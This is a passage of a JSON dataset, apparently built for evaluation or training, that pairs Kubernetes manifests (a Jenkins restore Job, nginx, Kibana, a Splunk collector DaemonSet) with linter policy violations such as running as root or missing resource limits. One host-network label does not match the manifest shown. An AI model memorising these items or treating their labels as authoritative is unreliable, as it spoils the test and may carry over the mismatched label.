    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: restore-jenkins\nspec:\n  template:\n    spec:\n      containers:\n      - name: download-dataset\n        image: google/cloud-sdk:latest\n        imagePullPolicy: Always\n        volumeMounts:\n        - mountPath: /certs\n          name: gcloud-certs\n          readOnly: true\n        - mountPath: /transfer\n          name: transfer\n        command:\n        - sh\n        - -c\n        - 'gcloud auth activate-service-account --key-file=/certs/svc_account.json\n\n\n          gsutil cp \"<JENKINS_BACKUP_BUCKET>/jenkins.tar.gz\" /transfer/jenkins.tar.gz\n\n          cd /transfer\n\n          tar -xzvf jenkins.tar.gz\n\n          rm jenkins.tar.gz\n\n          cd jenkins_home\n\n          find . -maxdepth 1 -exec mv {} .. \\;\n\n          cd ..\n\n          rm -rf jenkins_home\n\n          '\n      volumes:\n      - name: gcloud-certs\n        secret:\n          secretName: gcloud-creds\n      - name: transfer\n        persistentVolumeClaim:\n          claimName: <EXISTING_CLAIM>\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"download-dataset\" does not have a read-only root file system"
  },
  {
    "id": "2021",
    "manifest_path": "data/manifests/the_stack_sample/sample_0474.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: restore-jenkins\nspec:\n  template:\n    spec:\n      containers:\n      - name: download-dataset\n        image: google/cloud-sdk:latest\n        imagePullPolicy: Always\n        volumeMounts:\n        - mountPath: /certs\n          name: gcloud-certs\n          readOnly: true\n        - mountPath: /transfer\n          name: transfer\n        command:\n        - sh\n        - -c\n        - 'gcloud auth activate-service-account --key-file=/certs/svc_account.json\n\n\n          gsutil cp \"<JENKINS_BACKUP_BUCKET>/jenkins.tar.gz\" /transfer/jenkins.tar.gz\n\n          cd /transfer\n\n          tar -xzvf jenkins.tar.gz\n\n          rm jenkins.tar.gz\n\n          cd jenkins_home\n\n          find . -maxdepth 1 -exec mv {} .. \\;\n\n          cd ..\n\n          rm -rf jenkins_home\n\n          '\n      volumes:\n      - name: gcloud-certs\n        secret:\n          secretName: gcloud-creds\n      - name: transfer\n        persistentVolumeClaim:\n          claimName: <EXISTING_CLAIM>\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"download-dataset\" is not set to runAsNonRoot"
  },
  {
    "id": "2022",
    "manifest_path": "data/manifests/the_stack_sample/sample_0474.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: restore-jenkins\nspec:\n  template:\n    spec:\n      containers:\n      - name: download-dataset\n        image: google/cloud-sdk:latest\n        imagePullPolicy: Always\n        volumeMounts:\n        - mountPath: /certs\n          name: gcloud-certs\n          readOnly: true\n        - mountPath: /transfer\n          name: transfer\n        command:\n        - sh\n        - -c\n        - 'gcloud auth activate-service-account --key-file=/certs/svc_account.json\n\n\n          gsutil cp \"<JENKINS_BACKUP_BUCKET>/jenkins.tar.gz\" /transfer/jenkins.tar.gz\n\n          cd /transfer\n\n          tar -xzvf jenkins.tar.gz\n\n          rm jenkins.tar.gz\n\n          cd jenkins_home\n\n          find . -maxdepth 1 -exec mv {} .. \\;\n\n          cd ..\n\n          rm -rf jenkins_home\n\n          '\n      volumes:\n      - name: gcloud-certs\n        secret:\n          secretName: gcloud-creds\n      - name: transfer\n        persistentVolumeClaim:\n          claimName: <EXISTING_CLAIM>\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"download-dataset\" has cpu request 0"
  },
  {
    "id": "2023",
    "manifest_path": "data/manifests/the_stack_sample/sample_0474.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: restore-jenkins\nspec:\n  template:\n    spec:\n      containers:\n      - name: download-dataset\n        image: google/cloud-sdk:latest\n        imagePullPolicy: Always\n        volumeMounts:\n        - mountPath: /certs\n          name: gcloud-certs\n          readOnly: true\n        - mountPath: /transfer\n          name: transfer\n        command:\n        - sh\n        - -c\n        - 'gcloud auth activate-service-account --key-file=/certs/svc_account.json\n\n\n          gsutil cp \"<JENKINS_BACKUP_BUCKET>/jenkins.tar.gz\" /transfer/jenkins.tar.gz\n\n          cd /transfer\n\n          tar -xzvf jenkins.tar.gz\n\n          rm jenkins.tar.gz\n\n          cd jenkins_home\n\n          find . -maxdepth 1 -exec mv {} .. \\;\n\n          cd ..\n\n          rm -rf jenkins_home\n\n          '\n      volumes:\n      - name: gcloud-certs\n        secret:\n          secretName: gcloud-creds\n      - name: transfer\n        persistentVolumeClaim:\n          claimName: <EXISTING_CLAIM>\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"download-dataset\" has memory limit 0"
  },
  {
    "id": "2024",
    "manifest_path": "data/manifests/the_stack_sample/sample_0475.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.7.9\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "2025",
    "manifest_path": "data/manifests/the_stack_sample/sample_0475.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.7.9\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "2026",
    "manifest_path": "data/manifests/the_stack_sample/sample_0475.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.7.9\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "2027",
    "manifest_path": "data/manifests/the_stack_sample/sample_0475.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.7.9\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "2028",
    "manifest_path": "data/manifests/the_stack_sample/sample_0476.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: kibana-logging\n  labels:\n    k8s-app: kibana-logging\n    kubernetes.io/cluster-service: 'true'\n    kubernetes.io/name: Kibana\nspec:\n  type: LoadBalancer\n  selector:\n    component: kibana-logging\n  ports:\n  - name: http\n    port: 5601\n    protocol: TCP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[component:kibana-logging])"
  },
  {
    "id": "2029",
    "manifest_path": "data/manifests/the_stack_sample/sample_0479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "2030",
    "manifest_path": "data/manifests/the_stack_sample/sample_0479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"otel-collector\" does not expose port 13133 for the HTTPGet"
  },
  {
    "id": "2031",
    "manifest_path": "data/manifests/the_stack_sample/sample_0479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"fluentd\" does not have a read-only root file system"
  },
  {
    "id": "2032",
    "manifest_path": "data/manifests/the_stack_sample/sample_0479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n   